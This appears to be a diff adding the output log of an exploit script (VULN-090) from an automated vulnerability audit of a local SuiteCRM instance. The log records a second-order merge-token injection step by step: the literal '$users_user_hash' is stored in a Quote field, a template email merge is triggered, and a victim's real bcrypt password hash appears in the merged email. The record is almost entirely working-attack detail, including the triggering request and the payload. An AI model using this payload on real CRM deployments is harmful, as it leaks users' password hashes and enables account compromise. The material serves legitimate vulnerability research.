@@ -1,0 +1,17 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-090/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-090/../.venv
+========================================================================
+VULN-090: Second-order merge-token injection -> assigned user's user_hash exfil
+target: http://localhost:33116
+========================================================================
+[SETUP] admin session established
+[SETUP] created victim user mod_605fad0e (id=a97c4747-04a2-4588-8e0f-5c50e261f8d2) -- the account whose password hash we will exfiltrate
+[INFO] victim's REAL bcrypt user_hash (read from DB, for comparison only): $2y$10$Acb4wZZu79O0FN9hrgnlgeuiwck0VnpFHYw2CsbsxNw0wKM7kbas.
+[SETUP] created AOS_PDF_Templates 8afc1d3b-72c9-4398-ae95-97a6176c1402 -- body references ONLY the ordinary, legitimate merge field $aos_quotes_description (nothing sensitive typed in)
+[SETUP] created AOS_Quotes eb02fcfe-a8f9-4b7e-be12-7290134fbba7 -- description field (plain user-controlled text) = literal '$users_user_hash'; assigned_user_id = victim (mod_605fad0e)
+[STEP] triggering the real, synchronous merge: entryPoint=generatePdf&task=email (an ordinary authenticated 'compose email from this template' action)
+[INFO] generatePdf response: HTTP 302 Location='index.php?action=ComposeViewWithPdfTemplate&module=Emails&return_module=AOS_Quotes&return_action=DetailView&return_id=eb02fcfe-a8f9-4b7e-be12-7290134fbba7&record=7b954fb4-11bd-4017-8f8f-056ea4ec51aa'
+[INFO] merge produced Emails draft 7b954fb4-11bd-4017-8f8f-056ea4ec51aa
+[INFO] merged email body (emails_text.description_html): 'SECOND-ORDER-LEAK-START[$2y$10$Acb4wZZu79O0FN9hrgnlgeuiwck0VnpFHYw2CsbsxNw0wKM7kbas.]SECOND-ORDER-LEAK-END'
+[PROOF] the merged email body contains the VICTIM'S REAL user_hash ($2y$10$Acb4wZZu79O0FN9hrgnlgeuiwck0VnpFHYw2CsbsxNw0wKM7kbas.) inside our marker tokens -- exfiltrated purely by putting the literal string '$users_user_hash' in an ordinary Quote record field and letting a completely unrelated, benign template merge run.
+==> VULN-090: CONFIRMED — second-order injection exfiltrated victim mod_605fad0e's real bcrypt user_hash via an ordinary record field + a benign template merge
